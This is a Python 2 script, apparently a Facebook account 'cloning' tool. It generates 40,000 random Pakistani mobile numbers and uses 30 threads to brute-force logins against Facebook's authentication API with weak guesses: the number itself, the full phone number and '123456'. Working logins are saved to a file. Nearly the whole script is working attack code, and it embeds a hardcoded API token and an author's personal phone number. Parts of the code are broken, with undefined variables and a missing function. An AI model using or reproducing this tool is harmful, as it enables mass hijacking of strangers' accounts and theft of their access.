# Author Yunus#!/usr/bin/python2
#coding=utf-8
import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
os.system('rm -rf .txt')
for n in range(40000):

    nmbr = random.randint(1111111, 9999999)
    
    sys.stdout = open('.txt', 'a')

    print(nmbr)

    sys.stdout.flush()
    
try:
    import requests
except ImportError:
    os.system('pip2 install mechanize')
    
try:
    import mechanize
except ImportError:
    os.system('pip2 install request')
    time.sleep(1)
    os.system('Then type: python2 boss')

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def keluar():
	print 'Thanks.'
	os.sys.exit()

def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(00000.1)
def tik():
	titik = ['.   ','..  ','... ']
	for o in titik:
		print("\r\x1b[1;93mWEAIT PLAESE \x1b[1;91m"+o),;sys.stdout.flush();time.sleep(1)


back = 0
oks = []
id = []
cpb = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
print  """
\033[1;95m  _               _____ _____ 
\033[1;92m | |        /\   |  __ \_   _|
\033[1;94m | |       /  \  | |  | || |  
\033[1;96m | |      / /\ \ | |  | || |  
\033[1;97m | |____ / ____ \| |__| || |_ 
\033[1;91/5m |______/_/    \_\_____/_____|
                              
                              
"""

####Logo####

logo1 = """


\033[1;92m██╗      █████╗ ██████╗ ██╗
\033[1;93m██║     ██╔══██╗██╔══██╗██║
\033[1;92m██║     ███████║██║  ██║██║
\033[1;95m██║     ██╔══██║██║  ██║██║
\033[1;92m███████╗██║  ██║██████╔╝██║
\033[1;91m╚══════╝╚═╝  ╚═╝╚═════╝ ╚═╝
   


\033[1;92m➣ Athore     :                  LADI BALOCH

\033[1;92m➣ FACEBOOK     :          ZEEKO X3 QURBI

\033[1;92m➣ GITHUB       :              LADI404

\033[1;92m➣ WHATAAPP     :        +923403233915


"""
logo2 = """

\033[1;92m                                    
                                    
 \033[1;95m    ____            _     ________  ____
 \033[1;94m    `MM'           dM.    `MMMMMMMb.`MM'
 \033[1;95m    MM           ,MMb     MM    `Mb MM 
\033[1;94m     MM           d'YM.    MM     MM MM 
\033[1;95m     MM          ,P `Mb    MM     MM MM 
\033[1;94m     MM          d'  YM.   MM     MM MM 
 \033[1;95m    MM         ,P   `Mb   MM     MM MM 
\033[1;94m     MM         d'    YM.  MM     MM MM 
\033[1;95m     MM        ,MMMMMMMMb  MM     MM MM 
\033[1;94m     MM    /   d'      YM. MM    .M9 MM 
\033[1;92m    _MMMMMMM _dM_     _dMM_MMMMMMM9'_MM_
                                    


\033[1;92m> \033[1;92mAUTHOR    :   \033[1;95m LADI BALOCH
\033[1;92m> \033[1;93mFACEBOOK  :   \033[1;95m LADI X3 ZEEKO
\033[1;92m> \033[1;91mWHATSAPP  :   \033[1;95m+923403233915
\033[1;92m> \033[1;96mGITHUB    :         \033[1;95m LADI404

"""
CorrectUsername = "LADI"
CorrectPassword = "LADI"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;92m> \x1b[1;95mTOOL USERNAME ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;92m> \x1b[1;95mTOOL PASSWORD ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username #Dev:THE Ladi
	    time.sleep(2)
            loop = 'false'
        else:
            print "\033[1;92mWrong Password"
            os.system('xdg-open https://facebook.com/groups/2935007789952927/')
    else:
        print "\033[1;92mWrong Username"
        os.system('xdg-open https://facebook.com/groups/2935007789952927/')



##### LICENSE #####
#=================#
def lisensi():
    os.system('clear')
    login()
####login#########
def login():
    os.system('clear')
    print logo1
    print "\033[1;92m[LADI] START "
    time.sleep(0.05)
    
    time.sleep(0.05)
    print '\x1b[1;91m[0] EXIT'
    pilih_login()

def pilih_login():
    peak = raw_input("\n\033[1;92mCHOOSE: \033[1;92m")
    if peak =="":
        print "\x1b[1;97mFill In Correctly"
        pilih_login()
    elif peak =="LADI":
        Zeek()
def Zeek():
    os.system('clear')
    print logo1
    print '\x1b[1;92m[LADI] START CLONING '
    time.sleep(0.10)
    print '\x1b[1;92m[0] Back'
   
    time.sleep(0.05)
    action()

def action():
    peak = raw_input('\n\033[1;92m>>\033[1;92mCHOOSE: ')
    if peak =='':
        print '[!] Fill In Correctly'
        action()
    elif peak =="LADI":              
        os.system("clear")
        print logo2
        print "\033[1;94m➣ \033[1;93mEnter any Pakistan Mobile code Number"+'\n'
        print '\033[1;95m➣ \033[1;93mExample'
        print '\033[1;96m[+] Jazz    :  00 01 02 03 04 05 06 07 08 09   \033[1;92m[+] Zong    :  10 11 12 13 14 15 16 17 18      \033[1;92m[+] Warid   :  22 23 24 25                     \033[1;92m[+] Ufone   :  31 32 33 34 35 36 37 38         [+] Telenor :  40 41 42 43 44 45 46 47 48 49' 
        try:
            c = raw_input("\033[1;92m>>>\033[1;92mCHOOSE : ")
            k="03"
            idlist = ('.txt')
            for line in open(idlist,"r").readlines():
                id.append(line.strip())
        except IOError:
            print ("[!] File Not Found")
            raw_input("\n[ Back ]")
            blackmafiax()
    elif peak =='0':
        login()
    else:
        print '[!] Fill In Correctly'
        action()
    print 50* '\033[1;94m-'
    xxx = str(len(id))
    jalan ('\033[1;92m[✓] Total ids number: '+xxx)
    jalan ('\033[1;94m[✓] Code you choose: '+c)
    jalan ("\033[1;94m[✓] Wait A While Start Cracking...LADI BALOCH")
    jalan ("\033[1;94m[✓] To Stop Process Press Ctrl+z")
    print 50* '\033[1;97/2m-'
    def main(arg):
        global cpb,oks
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass1                                       
                okb = open('save/Checkpoint.txt', 'a')
                okb.write(k+c+user+pass1+'\n')
                okb.close()
                oks.append(c+user+pass1)
            else:
                if 'www.facebook.com' in q['error_msg']:
                    print '\033[1;95m[LADI√CP] ' + k + c + user + '  |  ' + pass1
                    cps = open('save/Checkpoint.txt', 'a')
                    cps.write(k+c+user+pass1+'\n')
                    cps.close()
                    cpb.append(c+user+pass1)
                else:
                    pass2 = k + c + user
                    data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                    q = json.load(data)
                    if 'access_token' in q:
                        print '\x1b[1;92m[Successfull] ' + k + c + user +  '  |  ' + pass2
                        okb = open('save/Checkpoint.txt', 'a')
                        okb.write(k+c+user+pass2+'\n')
                        okb.close()
                        oks.append(c+user+pass2)
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            print '\033[1;95m[LADI√CP] ] ' + k + c + user + '  |  ' + pass2
                            cps = open('save/Checkpoint.txt', 'a')
                            cps.write(k+c+user+pass2+'\n')
                            cps.close()
                            cpb.append(c+user+pass2)
                        else:
                            pass3="123456"
                            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
                            q = json.load(data)
                            if 'access_token' in q:
                                print '\x1b[1;92m[Successfull] ' + k + c + user + '  |  ' + pass3
                                okb = open('save/Checkpoint.txt', 'a')
                                okb.write(k+c+user+pass3+'\n')
                                okb.close()
                                oks.append(c+user+pass3)
                            else:
                               if 'www.facebook.com' in q['error_msg']:
                                   print '\033[1;95m[LADI√CP] ' + k + c + user + '  |  ' + pass3
                                   cps = open('save/Checkpoint.txt', 'a')
                                   cps.write(k+c+user+pass3+'\n')
                                   cps.close()
                                   cpb.append(c+user+pass3)
                                                                                                                                                                                                                                                                                                                                                                                                        
                                                                                                                                                                                                          
        except:
            pass
        
    p = ThreadPool(30)
    p.map(main, id)
    print 50* '\033[1;91m-'
    print 'Process Has Been Completed ...'
    print 'Total Online/Offline : '+str(len(oks))+'/'+str(len(cpb))
    print('Cloned Accounts Has Been Saved : save/Checkpoint')
    jalan("Note : Your Checkpoint Accounts Will Open after  12 days")
    print ''
    print """
    \033[1;92m  _______  _____ _____ _____ 
   \033[1;92m   | ____\ \/ /_ _|_   _| ____|
    \033[1;92m  |  _|  \  / | |  | | |  _|  
    \033[1;92m  | |___ /  \ | |  | | | |___ 
   \033[1;92m   |_____/_/\_\___| |_| |_____|
                             

"""

    
    raw_input("\n\033[1;92m[\033[1;92mBack\033[1;95m]")
    login() 
          
if __name__ == '__main__':
    login()

